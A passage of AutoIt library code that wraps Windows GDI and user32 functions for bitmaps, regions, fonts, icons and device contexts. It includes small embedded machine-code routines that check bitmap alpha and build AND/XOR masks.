		Local $aresult = DllCall("gdi32.dll", "int", "CombineRgn", "handle", $hrgndest, "handle", $hrgnsrc1, "handle", $hrgnsrc2, "int", $icombinemode)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aresult[0]
	EndFunc

	Func _winapi_copybitmap($hbitmap)
		$hbitmap = _winapi_copyimage($hbitmap, 0, 0, 0, 8192)
		Return SetError(@error, @extended, $hbitmap)
	EndFunc

	Func _winapi_copyimage($himage, $itype = 0, $ixdesiredpixels = 0, $iydesiredpixels = 0, $iflags = 0)
		Local $aret = DllCall("user32.dll", "handle", "CopyImage", "handle", $himage, "uint", $itype, "int", $ixdesiredpixels, "int", $iydesiredpixels, "uint", $iflags)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_createandbitmap($hbitmap)
		Local $ierror = 0, $hdib = 0
		$hbitmap = _winapi_copybitmap($hbitmap)
		If NOT $hbitmap Then Return SetError(@error + 20, @extended, 0)
		Do
			Local $atdib[2]
			$atdib[0] = DllStructCreate($tagdibsection)
			If (NOT _winapi_getobject($hbitmap, DllStructGetSize($atdib[0]), $atdib[0])) OR (DllStructGetData($atdib[0], "bmBitsPixel") <> 32) OR (DllStructGetData($atdib[0], "biCompression")) Then
				$ierror = 10
				ExitLoop
			EndIf
			$atdib[1] = DllStructCreate($tagbitmap)
			$hdib = _winapi_createdib(DllStructGetData($atdib[0], "bmWidth"), DllStructGetData($atdib[0], "bmHeight"), 1)
			If NOT _winapi_getobject($hdib, DllStructGetSize($atdib[1]), $atdib[1]) Then
				$ierror = 11
				ExitLoop
			EndIf
			Local $aret = DllCall("user32.dll", "lresult", "CallWindowProc", "ptr", __andproc(), "ptr", 0, "uint", 0, "wparam", DllStructGetPtr($atdib[0]), "lparam", DllStructGetPtr($atdib[1]))
			If @error Then
				$ierror = @error
				ExitLoop
			EndIf
			If NOT $aret[0] Then
				$ierror = 12
				ExitLoop
			EndIf
			$ierror = 0
		Until 1
		_winapi_deleteobject($hbitmap)
		If $ierror Then
			If $hdib Then
				_winapi_deleteobject($hdib)
			EndIf
			$hdib = 0
		EndIf
		Return SetError($ierror, 0, $hdib)
	EndFunc

	Func _winapi_createbitmap($iwidth, $iheight, $iplanes = 1, $ibitsperpel = 1, $pbits = 0)
		Local $aresult = DllCall("gdi32.dll", "handle", "CreateBitmap", "int", $iwidth, "int", $iheight, "uint", $iplanes, "uint", $ibitsperpel, "struct*", $pbits)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aresult[0]
	EndFunc

	Func _winapi_createcompatiblebitmap($hdc, $iwidth, $iheight)
		Local $aresult = DllCall("gdi32.dll", "handle", "CreateCompatibleBitmap", "handle", $hdc, "int", $iwidth, "int", $iheight)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aresult[0]
	EndFunc

	Func _winapi_createdib($iwidth, $iheight, $ibitsperpel = 32, $tcolortable = 0, $icolorcount = 0)
		Local $argbq[2], $icolors, $tagrgbq
		Switch $ibitsperpel
			Case 1
				$icolors = 2
			Case 4
				$icolors = 16
			Case 8
				$icolors = 256
			Case Else
				$icolors = 0
		EndSwitch
		If $icolors Then
			If NOT IsDllStruct($tcolortable) Then
				Switch $ibitsperpel
					Case 1
						$argbq[0] = 0
						$argbq[1] = 16777215
						$tcolortable = _winapi_createdibcolortable($argbq)
					Case Else
				EndSwitch
			Else
				If $icolors > $icolorcount Then
					$icolors = $icolorcount
				EndIf
				If (NOT $icolors) OR ((4 * $icolors) > DllStructGetSize($tcolortable)) Then
					Return SetError(20, 0, 0)
				EndIf
			EndIf
			$tagrgbq = ";dword aRGBQuad[" & $icolors & "]"
		Else
			$tagrgbq = ""
		EndIf
		Local $tbitmapinfo = DllStructCreate($tagbitmapinfoheader & $tagrgbq)
		DllStructSetData($tbitmapinfo, "biSize", 40)
		DllStructSetData($tbitmapinfo, "biWidth", $iwidth)
		DllStructSetData($tbitmapinfo, "biHeight", $iheight)
		DllStructSetData($tbitmapinfo, "biPlanes", 1)
		DllStructSetData($tbitmapinfo, "biBitCount", $ibitsperpel)
		DllStructSetData($tbitmapinfo, "biCompression", 0)
		DllStructSetData($tbitmapinfo, "biSizeImage", 0)
		DllStructSetData($tbitmapinfo, "biXPelsPerMeter", 0)
		DllStructSetData($tbitmapinfo, "biYPelsPerMeter", 0)
		DllStructSetData($tbitmapinfo, "biClrUsed", $icolors)
		DllStructSetData($tbitmapinfo, "biClrImportant", 0)
		If $icolors Then
			If IsDllStruct($tcolortable) Then
				_winapi_movememory(DllStructGetPtr($tbitmapinfo, "aRGBQuad"), $tcolortable, 4 * $icolors)
			Else
				_winapi_zeromemory(DllStructGetPtr($tbitmapinfo, "aRGBQuad"), 4 * $icolors)
			EndIf
		EndIf
		Local $hbitmap = _winapi_createdibsection(0, $tbitmapinfo, 0, $__g_vext)
		If NOT $hbitmap Then Return SetError(@error, @extended, 0)
		Return $hbitmap
	EndFunc

	Func _winapi_createdibsection($hdc, $tbitmapinfo, $iusage, ByRef $pbits, $hsection = 0, $ioffset = 0)
		$pbits = 0
		Local $aret = DllCall("gdi32.dll", "handle", "CreateDIBSection", "handle", $hdc, "struct*", $tbitmapinfo, "uint", $iusage, "ptr*", 0, "handle", $hsection, "dword", $ioffset)
		If @error OR NOT $aret[0] Then Return SetError(@error, @extended, 0)
		$pbits = $aret[4]
		Return $aret[0]
	EndFunc

	Func _winapi_createdibcolortable(Const ByRef $acolortable, $istart = 0, $iend = -1)
		If __checkerrorarraybounds($acolortable, $istart, $iend) Then Return SetError(@error + 10, @extended, 0)
		Local $tcolortable = DllStructCreate("dword[" & ($iend - $istart + 1) & "]")
		Local $icount = 1
		For $i = $istart To $iend
			DllStructSetData($tcolortable, 1, _winapi_switchcolor(__rgb($acolortable[$i])), $icount)
			$icount += 1
		Next
		Return $tcolortable
	EndFunc

	Func _winapi_createfont($iheight, $iwidth, $iescape = 0, $iorientn = 0, $iweight = $__winapiconstant_fw_normal, $bitalic = False, $bunderline = False, $bstrikeout = False, $icharset = $__winapiconstant_default_charset, $ioutputprec = $__winapiconstant_out_default_precis, $iclipprec = $__winapiconstant_clip_default_precis, $iquality = $__winapiconstant_default_quality, $ipitch = 0, $sface = "Arial")
		Local $aresult = DllCall("gdi32.dll", "handle", "CreateFontW", "int", $iheight, "int", $iwidth, "int", $iescape, "int", $iorientn, "int", $iweight, "dword", $bitalic, "dword", $bunderline, "dword", $bstrikeout, "dword", $icharset, "dword", $ioutputprec, "dword", $iclipprec, "dword", $iquality, "dword", $ipitch, "wstr", $sface)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aresult[0]
	EndFunc

	Func _winapi_createfontindirect($tlogfont)
		Local $aresult = DllCall("gdi32.dll", "handle", "CreateFontIndirectW", "struct*", $tlogfont)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aresult[0]
	EndFunc

	Func _winapi_createrectrgn($ileftrect, $itoprect, $irightrect, $ibottomrect)
		Local $aresult = DllCall("gdi32.dll", "handle", "CreateRectRgn", "int", $ileftrect, "int", $itoprect, "int", $irightrect, "int", $ibottomrect)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aresult[0]
	EndFunc

	Func _winapi_createroundrectrgn($ileftrect, $itoprect, $irightrect, $ibottomrect, $iwidthellipse, $iheightellipse)
		Local $aresult = DllCall("gdi32.dll", "handle", "CreateRoundRectRgn", "int", $ileftrect, "int", $itoprect, "int", $irightrect, "int", $ibottomrect, "int", $iwidthellipse, "int", $iheightellipse)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aresult[0]
	EndFunc

	Func _winapi_createsolidbrush($icolor)
		Local $aresult = DllCall("gdi32.dll", "handle", "CreateSolidBrush", "INT", $icolor)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aresult[0]
	EndFunc

	Func _winapi_getbitmapdimension($hbitmap)
		Local $tobj = DllStructCreate($tagbitmap)
		Local $aret = DllCall("gdi32.dll", "int", "GetObject", "handle", $hbitmap, "int", DllStructGetSize($tobj), "struct*", $tobj)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
		Return _winapi_createsize(DllStructGetData($tobj, "bmWidth"), DllStructGetData($tobj, "bmHeight"))
	EndFunc

	Func _winapi_getsyscolorbrush($iindex)
		Local $aresult = DllCall("user32.dll", "handle", "GetSysColorBrush", "int", $iindex)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aresult[0]
	EndFunc

	Func _winapi_gettextextentpoint32($hdc, $stext)
		Local $tsize = DllStructCreate($tagsize)
		Local $isize = StringLen($stext)
		Local $aret = DllCall("gdi32.dll", "bool", "GetTextExtentPoint32W", "handle", $hdc, "wstr", $stext, "int", $isize, "struct*", $tsize)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
		Return $tsize
	EndFunc

	Func _winapi_gettextmetrics($hdc)
		Local $ttextmetric = DllStructCreate($tagtextmetric)
		Local $aret = DllCall("gdi32.dll", "bool", "GetTextMetricsW", "handle", $hdc, "struct*", $ttextmetric)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
		Return $ttextmetric
	EndFunc

	Func _winapi_getwindowrgn($hwnd, $hrgn)
		Local $aresult = DllCall("user32.dll", "int", "GetWindowRgn", "hwnd", $hwnd, "handle", $hrgn)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aresult[0]
	EndFunc

	Func _winapi_isalphabitmap($hbitmap)
		$hbitmap = _winapi_copybitmap($hbitmap)
		If NOT $hbitmap Then Return SetError(@error + 20, @extended, 0)
		Local $aret, $ierror = 0
		Do
			Local $tdib = DllStructCreate($tagdibsection)
			If (NOT _winapi_getobject($hbitmap, DllStructGetSize($tdib), $tdib)) OR (DllStructGetData($tdib, "bmBitsPixel") <> 32) OR (DllStructGetData($tdib, "biCompression")) Then
				$ierror = 1
				ExitLoop
			EndIf
			$aret = DllCall("user32.dll", "int", "CallWindowProc", "ptr", __alphaproc(), "ptr", 0, "uint", 0, "struct*", $tdib, "ptr", 0)
			If @error OR ($aret[0] = -1) Then
				$ierror = @error + 10
				ExitLoop
			EndIf
		Until 1
		_winapi_deleteobject($hbitmap)
		If $ierror Then Return SetError($ierror, 0, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_ptinrect(ByRef $trect, ByRef $tpoint)
		Local $aresult = DllCall("user32.dll", "bool", "PtInRect", "struct*", $trect, "struct", $tpoint)
		If @error Then Return SetError(@error, @extended, False)
		Return $aresult[0]
	EndFunc

	Func _winapi_redrawwindow($hwnd, $trect = 0, $hregion = 0, $iflags = 5)
		Local $aresult = DllCall("user32.dll", "bool", "RedrawWindow", "hwnd", $hwnd, "struct*", $trect, "handle", $hregion, "uint", $iflags)
		If @error Then Return SetError(@error, @extended, False)
		Return $aresult[0]
	EndFunc

	Func _winapi_setwindowrgn($hwnd, $hrgn, $bredraw = True)
		Local $aresult = DllCall("user32.dll", "int", "SetWindowRgn", "hwnd", $hwnd, "handle", $hrgn, "bool", $bredraw)
		If @error Then Return SetError(@error, @extended, False)
		Return $aresult[0]
	EndFunc

#EndRegion Public Functions
#Region Embedded DLL Functions

	Func __alphaproc()
		Static $pproc = 0
		If NOT $pproc Then
			If @AutoItX64 Then
				$pproc = __init(Binary("0x48894C240848895424104C894424184C894C24205541574831C050504883EC28" & "48837C24600074054831C0EB0748C7C0010000004821C0751F488B6C24604883" & "7D180074054831C0EB0748C7C0010000004821C07502EB0948C7C001000000EB" & "034831C04821C0740C48C7C0FFFFFFFF4863C0EB6F48C744242800000000488B" & "6C24604C637D04488B6C2460486345084C0FAFF849C1E7024983C7FC4C3B7C24" & "287C36488B6C24604C8B7D184C037C24284983C7034C897C2430488B6C243080" & "7D0000740C48C7C0010000004863C0EB1348834424280471A54831C04863C0EB" & "034831C04883C438415F5DC3"))
			Else
				$pproc = __init(Binary("0x555331C05050837C241C00740431C0EB05B80100000021C075198B6C241C837D" & "1400740431C0EB05B80100000021C07502EB07B801000000EB0231C021C07407" & "B8FFFFFFFFEB4FC70424000000008B6C241C8B5D048B6C241C0FAF5D08C1E302" & "83C3FC3B1C247C288B6C241C8B5D14031C2483C303895C24048B6C2404807D00" & "007407B801000000EB0C8304240471BE31C0EB0231C083C4085B5DC21000"))
			EndIf
		EndIf
		Return $pproc
	EndFunc

	Func __andproc()
		Static $pproc = 0
		If NOT $pproc Then
			If @AutoItX64 Then
				$pproc = __init(Binary("0x48894C240848895424104C894424184C894C2420554157415648C7C009000000" & "4883EC0848C704240000000048FFC875EF4883EC284883BC24A0000000007405" & "4831C0EB0748C7C0010000004821C00F85840000004883BC24A8000000007405" & "4831C0EB0748C7C0010000004821C07555488BAC24A000000048837D18007405" & "4831C0EB0748C7C0010000004821C07522488BAC24A800000048837D18007405" & "4831C0EB0748C7C0010000004821C07502EB0948C7C001000000EB034831C048" & "21C07502EB0948C7C001000000EB034831C04821C07502EB0948C7C001000000" & "EB034831C04821C0740B4831C04863C0E9D701000048C74424280000000048C7" & "44243000000000488BAC24A00000004C637D0849FFCF4C3B7C24300F8C9C0100" & "0048C74424380000000048C74424400000000048C744244800000000488BAC24" & "A00000004C637D0449FFCF4C3B7C24480F8CDB000000488BAC24A00000004C8B" & "7D184C037C24284983C7034C897C2450488B6C2450807D000074264C8B7C2440" & "4C8B74243849F7DE4983C61F4C89F148C7C00100000048D3E04909C74C897C24" & "4048FF4424384C8B7C24384983FF1F7E6F4C8B7C244049F7D74C897C244048C7" & "442458180000004831C0483B4424587F3D488BAC24A80000004C8B7D184C037C" & "24604C897C24504C8B7C2440488B4C245849D3FF4C89F850488B6C2458588845" & "0048FF4424604883442458F871B948C74424380000000048C744244000000000" & "48834424280448FF4424480F810BFFFFFF48837C24380074794C8B7C244049F7" & "D74C8B74243849F7DE4983C6204C89F148C7C0FFFFFFFF48D3E04921C74C897C" & "244048C7442458180000004831C0483B4424587F3D488BAC24A80000004C8B7D" & "184C037C24604C897C24504C8B7C2440488B4C245849D3FF4C89F850488B6C24" & "585888450048FF4424604883442458F871B948FF4424300F814AFEFFFF48C7C0" & "010000004863C0EB034831C04883C470415E415F5DC3"))
			Else
				$pproc = __init(Binary("0x555357BA0800000083EC04C70424000000004A75F3837C243800740431C0EB05" & "B80100000021C07562837C243C00740431C0EB05B80100000021C0753F8B6C24" & "38837D1400740431C0EB05B80100000021C075198B6C243C837D1400740431C0" & "EB05B80100000021C07502EB07B801000000EB0231C021C07502EB07B8010000" & "00EB0231C021C07502EB07B801000000EB0231C021C0740731C0E969010000C7" & "042400000000C7442404000000008B6C24388B5D084B3B5C24040F8C3F010000" & "C744240800000000C744240C00000000C7442410000000008B6C24388B5D044B" & "3B5C24100F8CA90000008B6C24388B5D14031C2483C303895C24148B6C241480" & "7D0000741C8B5C240C8B7C2408F7DF83C71F89F9B801000000D3E009C3895C24" & "0CFF4424088B5C240883FB1F7E578B5C240CF7D3895C240CC744241818000000" & "31C03B4424187F2D8B6C243C8B5D14035C241C895C24148B5C240C8B4C2418D3" & "FB538B6C241858884500FF44241C83442418F871CBC744240800000000C74424" & "0C0000000083042404FF4424100F8145FFFFFF837C240800745B8B5C240CF7D3" & "8B7C2408F7DF83C72089F9B8FFFFFFFFD3E021C3895C240CC744241818000000" & "31C03B4424187F2D8B6C243C8B5D14035C241C895C24148B5C240C8B4C2418D3" & "FB538B6C241858884500FF44241C83442418F871CBFF4424040F81AFFEFFFFB8" & "01000000EB0231C083C4205F5B5DC21000"))
			EndIf
		EndIf
		Return $pproc
	EndFunc

	Func __xorproc()
		Static $pproc = 0
		If NOT $pproc Then
			If @AutoItX64 Then
				$pproc = __init(Binary("0x48894C240848895424104C894424184C894C24205541574831C050504883EC28" & "48837C24600074054831C0EB0748C7C0010000004821C0751B48837C24680074" & "054831C0EB0748C7C0010000004821C07502EB0948C7C001000000EB034831C0" & "4821C074084831C04863C0EB7748C7442428000000004C637C24584983C7FC4C" & "3B7C24287C4F4C8B7C24604C037C24284C897C2430488B6C2430807D00007405" & "4831C0EB0748C7C0010000004821C0741C4C8B7C24684C037C24284983C7034C" & "897C2430488B6C2430C64500FF48834424280471A148C7C0010000004863C0EB" & "034831C04883C438415F5DC3"))
			Else
				$pproc = __init(Binary("0x555331C05050837C241C00740431C0EB05B80100000021C07516837C24200074" & "0431C0EB05B80100000021C07502EB07B801000000EB0231C021C0740431C0EB" & "5AC70424000000008B5C241883C3FC3B1C247C3E8B5C241C031C24895C24048B" & "6C2404807D0000740431C0EB05B80100000021C074168B5C2420031C2483C303" & "895C24048B6C2404C64500FF8304240471B6B801000000EB0231C083C4085B5D" & "C21000"))
			EndIf
		EndIf
		Return $pproc
	EndFunc

#EndRegion Embedded DLL Functions
#Region Internal Functions

	Func __init($ddata)
		Local $ilength = BinaryLen($ddata)
		Local $aret = DllCall("kernel32.dll", "ptr", "VirtualAlloc", "ptr", 0, "ulong_ptr", $ilength, "dword", 4096, "dword", 64)
		If @error OR NOT $aret[0] Then __fatalexit(1, "Error allocating memory.")
		Local $tdata = DllStructCreate("byte[" & $ilength & "]", $aret[0])
		DllStructSetData($tdata, 1, $ddata)
		Return $aret[0]
	EndFunc

#EndRegion Internal Functions
#Region Global Variables and Constants
	Global Const $di_mask = 1
	Global Const $di_image = 2
	Global Const $di_normal = 3
	Global Const $di_compat = 4
	Global Const $di_defaultsize = 8
	Global Const $di_nomirror = 16
	Global Const $display_device_attached_to_desktop = 1
	Global Const $display_device_multi_driver = 2
	Global Const $display_device_primary_device = 4
	Global Const $display_device_mirroring_driver = 8
	Global Const $display_device_vga_compatible = 16
	Global Const $display_device_removable = 32
	Global Const $display_device_disconnect = 33554432
	Global Const $display_device_remote = 67108864
	Global Const $display_device_modespruned = 134217728
#EndRegion Global Variables and Constants
#Region Functions list
#EndRegion Functions list
#Region Public Functions

	Func _winapi_createcompatibledc($hdc)
		Local $aresult = DllCall("gdi32.dll", "handle", "CreateCompatibleDC", "handle", $hdc)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aresult[0]
	EndFunc

	Func _winapi_deletedc($hdc)
		Local $aresult = DllCall("gdi32.dll", "bool", "DeleteDC", "handle", $hdc)
		If @error Then Return SetError(@error, @extended, False)
		Return $aresult[0]
	EndFunc

	Func _winapi_drawedge($hdc, $trect, $iedgetype, $iflags)
		Local $aresult = DllCall("user32.dll", "bool", "DrawEdge", "handle", $hdc, "struct*", $trect, "uint", $iedgetype, "uint", $iflags)
		If @error Then Return SetError(@error, @extended, False)
		Return $aresult[0]
	EndFunc

	Func _winapi_drawframecontrol($hdc, $trect, $itype, $istate)
		Local $aresult = DllCall("user32.dll", "bool", "DrawFrameControl", "handle", $hdc, "struct*", $trect, "uint", $itype, "uint", $istate)
		If @error Then Return SetError(@error, @extended, False)
		Return $aresult[0]
	EndFunc

	Func _winapi_drawicon($hdc, $ix, $iy, $hicon)
		Local $aresult = DllCall("user32.dll", "bool", "DrawIcon", "handle", $hdc, "int", $ix, "int", $iy, "handle", $hicon)
		If @error Then Return SetError(@error, @extended, False)
		Return $aresult[0]
	EndFunc

	Func _winapi_drawiconex($hdc, $ix, $iy, $hicon, $iwidth = 0, $iheight = 0, $istep = 0, $hbrush = 0, $iflags = 3)
		Local $ioptions
		Switch $iflags
			Case 1
				$ioptions = $di_mask
			Case 2
				$ioptions = $di_image
			Case 3
				$ioptions = $di_normal
			Case 4
				$ioptions = $di_compat
			Case 5
				$ioptions = $di_defaultsize
			Case Else
				$ioptions = $di_nomirror
		EndSwitch
		Local $aresult = DllCall("user32.dll", "bool", "DrawIconEx", "handle", $hdc, "int", $ix, "int", $iy, "handle", $hicon, "int", $iwidth, "int", $iheight, "uint", $istep, "handle", $hbrush, "uint", $ioptions)
		If @error Then Return SetError(@error, @extended, False)
		Return $aresult[0]
	EndFunc

	Func _winapi_drawtext($hdc, $stext, ByRef $trect, $iflags)
		Local $aresult = DllCall("user32.dll", "int", "DrawTextW", "handle", $hdc, "wstr", $stext, "int", -1, "struct*", $trect, "uint", $iflags)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aresult[0]
	EndFunc

	Func _winapi_enumdisplaydevices($sdevice, $idevnum)
		Local $tname = 0, $iflags = 0, $adevice[5]
		If $sdevice <> "" Then
			$tname = DllStructCreate("wchar Text[" & StringLen($sdevice) + 1 & "]")
			DllStructSetData($tname, "Text", $sdevice)
		EndIf
		Local Const $tagdisplay_device = "dword Size;wchar Name[32];wchar String[128];dword Flags;wchar ID[128];wchar Key[128]"
		Local $tdevice = DllStructCreate($tagdisplay_device)
		Local $idevice = DllStructGetSize($tdevice)
		DllStructSetData($tdevice, "Size", $idevice)
		Local $aret = DllCall("user32.dll", "bool", "EnumDisplayDevicesW", "struct*", $tname, "dword", $idevnum, "struct*", $tdevice, "dword", 1)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
		Local $in = DllStructGetData($tdevice, "Flags")
		If BitAND($in, $display_device_attached_to_desktop) <> 0 Then $iflags = BitOR($iflags, 1)
		If BitAND($in, $display_device_primary_device) <> 0 Then $iflags = BitOR($iflags, 2)
		If BitAND($in, $display_device_mirroring_driver) <> 0 Then $iflags = BitOR($iflags, 4)
		If BitAND($in, $display_device_vga_compatible) <> 0 Then $iflags = BitOR($iflags, 8)
		If BitAND($in, $display_device_removable) <> 0 Then $iflags = BitOR($iflags, 16)
		If BitAND($in, $display_device_modespruned) <> 0 Then $iflags = BitOR($iflags, 32)
		$adevice[0] = True
		$adevice[1] = DllStructGetData($tdevice, "Name")
		$adevice[2] = DllStructGetData($tdevice, "String")
		$adevice[3] = $iflags
		$adevice[4] = DllStructGetData($tdevice, "ID")
		Return $adevice
	EndFunc

	Func _winapi_fillrect($hdc, $trect, $hbrush)
		Local $aresult
		If IsPtr($hbrush) Then
			$aresult = DllCall("user32.dll", "int", "FillRect", "handle", $hdc, "struct*", $trect, "handle", $hbrush)
		Else
			$aresult = DllCall("user32.dll", "int", "FillRect", "handle", $hdc, "struct*", $trect, "dword_ptr", $hbrush)
		EndIf
		If @error Then Return SetError(@error, @extended, False)
		Return $aresult[0]
	EndFunc

	Func _winapi_framerect($hdc, $trect, $hbrush)
		Local $aresult = DllCall("user32.dll", "int", "FrameRect", "handle", $hdc, "struct*", $trect, "handle", $hbrush)
		If @error Then Return SetError(@error, @extended, False)
		Return $aresult[0]
	EndFunc

	Func _winapi_getbkmode($hdc)
		Local $aresult = DllCall("gdi32.dll", "int", "GetBkMode", "handle", $hdc)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aresult[0]
	EndFunc

	Func _winapi_getdc($hwnd)
		Local $aresult = DllCall("user32.dll", "handle", "GetDC", "hwnd", $hwnd)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aresult[0]
	EndFunc

	Func _winapi_getdcex($hwnd, $hrgn, $iflags)
		Local $aret = DllCall("user32.dll", "handle", "GetDCEx", "hwnd", $hwnd, "handle", $hrgn, "dword", $iflags)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_getdevicecaps($hdc, $iindex)
		Local $aresult = DllCall("gdi32.dll", "int", "GetDeviceCaps", "handle", $hdc, "int", $iindex)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aresult[0]
	EndFunc

	Func _winapi_gettextcolor($hdc)
		Local $aret = DllCall("gdi32.dll", "dword", "GetTextColor", "handle", $hdc)
		If @error OR ($aret[0] = 4294967295) Then Return SetError(@error, @extended, -1)
		Return __rgb($aret[0])
	EndFunc

	Func _winapi_getwindowdc($hwnd)
		Local $aresult = DllCall("user32.dll", "handle", "GetWindowDC", "hwnd", $hwnd)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aresult[0]
	EndFunc

	Func _winapi_printwindow($hwnd, $hdc, $bclient = False)
		Local $aret = DllCall("user32.dll", "bool", "PrintWindow", "hwnd", $hwnd, "handle", $hdc, "uint", $bclient)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_releasedc($hwnd, $hdc)
		Local $aresult = DllCall("user32.dll", "int", "ReleaseDC", "hwnd", $hwnd, "handle", $hdc)
		If @error Then Return SetError(@error, @extended, False)
		Return $aresult[0]
	EndFunc

	Func _winapi_restoredc($hdc, $iid)
		Local $aret = DllCall("gdi32.dll", "bool", "RestoreDC", "handle", $hdc, "int", $iid)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_savedc($hdc)
		Local $aret = DllCall("gdi32.dll", "int", "SaveDC", "handle", $hdc)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_setbkcolor($hdc, $icolor)
		Local $aresult = DllCall("gdi32.dll", "INT", "SetBkColor", "handle", $hdc, "INT", $icolor)
		If @error Then Return SetError(@error, @extended, -1)
		Return $aresult[0]
	EndFunc

	Func _winapi_setbkmode($hdc, $ibkmode)
		Local $aresult = DllCall("gdi32.dll", "int", "SetBkMode", "handle", $hdc, "int", $ibkmode)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aresult[0]
	EndFunc

	Func _winapi_settextcolor($hdc, $icolor)
		Local $aresult = DllCall("gdi32.dll", "INT", "SetTextColor", "handle", $hdc, "INT", $icolor)
		If @error Then Return SetError(@error, @extended, -1)
		Return $aresult[0]
	EndFunc

	Func _winapi_twipsperpixelx()
		Local $hdc, $itwipsperpixelx
		$hdc = _winapi_getdc(0)
		Local Const $__winapiconstant_logpixelsx = 88
		$itwipsperpixelx = 1440 / _winapi_getdevicecaps($hdc, $__winapiconstant_logpixelsx)
		_winapi_releasedc(0, $hdc)
		Return $itwipsperpixelx
	EndFunc

	Func _winapi_twipsperpixely()
		Local $hdc, $itwipsperpixely
		$hdc = _winapi_getdc(0)
		Local Const $__winapiconstant_logpixelsy = 90
		$itwipsperpixely = 1440 / _winapi_getdevicecaps($hdc, $__winapiconstant_logpixelsy)
		_winapi_releasedc(0, $hdc)
		Return $itwipsperpixely
	EndFunc

#EndRegion Public Functions
#Region Internal Functions
#EndRegion Internal Functions
#Region Global Variables and Constants
#EndRegion Global Variables and Constants
#Region Functions list
#EndRegion Functions list
#Region Public Functions
	Global Const $tagiconinfo = "bool Icon;dword XHotSpot;dword YHotSpot;handle hMask;handle hColor"

	Func _winapi_addicontransparency($hicon, $ipercent = 50, $bdelete = False)
		Local $tbitmap, $hdib = 0, $hresult = 0
		Local $ahbitmap[2]
		Local $ticoninfo = DllStructCreate($tagiconinfo)
		Local $aret = DllCall("user32.dll", "bool", "GetIconInfo", "handle", $hicon, "struct*", $ticoninfo)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
		For $i = 0 To 1
			$ahbitmap[$i] = DllStructGetData($ticoninfo, $i + 4)
		Next
		Local $ierror = 0
		Do
			$hdib = _winapi_copybitmap($ahbitmap[1])
			If NOT $hdib Then
				$ierror = 20
				ExitLoop
			EndIf
			$tbitmap = DllStructCreate($tagbitmap)
			If (NOT _winapi_getobject($hdib, DllStructGetSize($tbitmap), $tbitmap)) OR (DllStructGetData($tbitmap, "bmBitsPixel") <> 32) Then
				$ierror = 21
				ExitLoop
			EndIf
			$aret = DllCall("user32.dll", "lresult", "CallWindowProc", "PTR", __transparencyproc(), "hwnd", 0, "uint", $ipercent, "wparam", DllStructGetPtr($tbitmap), "lparam", 0)
			If @error OR NOT $aret[0] Then
				$ierror = @error + 30
				ExitLoop
			EndIf
			If $aret[0] = -1 Then
				$hresult = _winapi_createemptyicon(DllStructGetData($tbitmap, "bmWidth"), DllStructGetData($tbitmap, "bmHeight"))
			Else
				$hresult = _winapi_createiconindirect($hdib, $ahbitmap[0])
			EndIf
			If NOT $hresult Then $ierror = 22
		Until 1
		If $hdib Then
			_winapi_deleteobject($hdib)
		EndIf
		For $i = 0 To 1
			If $ahbitmap[$i] Then
				_winapi_deleteobject($ahbitmap[$i])
			EndIf
		Next
		If $ierror Then Return SetError($ierror, 0, 0)
		If $bdelete Then
			_winapi_destroyicon($hicon)
		EndIf
		Return $hresult
	EndFunc

	Func _winapi_copyicon($hicon)
		Local $aresult = DllCall("user32.dll", "handle", "CopyIcon", "handle", $hicon)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aresult[0]
	EndFunc

	Func _winapi_create32bithicon($hicon, $bdelete = False)
		Local $ahbitmap[2], $hresult = 0
		Local $adib[2][2] = [[0, 0], [0, 0]]
		Local $ticoninfo = DllStructCreate($tagiconinfo)
		Local $aret = DllCall("user32.dll", "bool", "GetIconInfo", "handle", $hicon, "struct*", $ticoninfo)
		If @error Then Return SetError(@error, @extended, 0)
		If NOT $aret[0] Then Return SetError(10, 0, 0)
		For $i = 0 To 1
			$ahbitmap[$i] = DllStructGetData($ticoninfo, $i + 4)
		Next
		If _winapi_isalphabitmap($ahbitmap[1]) Then
			$adib[0][0] = _winapi_createandbitmap($ahbitmap[1])
			If NOT @error Then
				$hresult = _winapi_createiconindirect($ahbitmap[1], $adib[0][0])
			EndIf
		Else
			Local $tsize = _winapi_getbitmapdimension($ahbitmap[1])
			Local $asize[2]
			For $i = 0 To 1
				$asize[$i] = DllStructGetData($tsize, $i + 1)
			Next
			Local $hsrcdc = _winapi_createcompatibledc(0)
			Local $hdstdc = _winapi_createcompatibledc(0)
			Local $hsrcsv, $hdstsv
			For $i = 0 To 1
				$adib[$i][0] = _winapi_createdib($asize[0], $asize[1])
				$adib[$i][1] = $__g_vext
				$hsrcsv = _winapi_selectobject($hsrcdc, $ahbitmap[$i])
				$hdstsv = _winapi_selectobject($hdstdc, $adib[$i][0])
				_winapi_bitblt($hdstdc, 0, 0, $asize[0], $asize[1], $hsrcdc, 0, 0, 12583114)
				_winapi_selectobject($hsrcdc, $hsrcsv)
				_winapi_selectobject($hdstdc, $hdstsv)
			Next
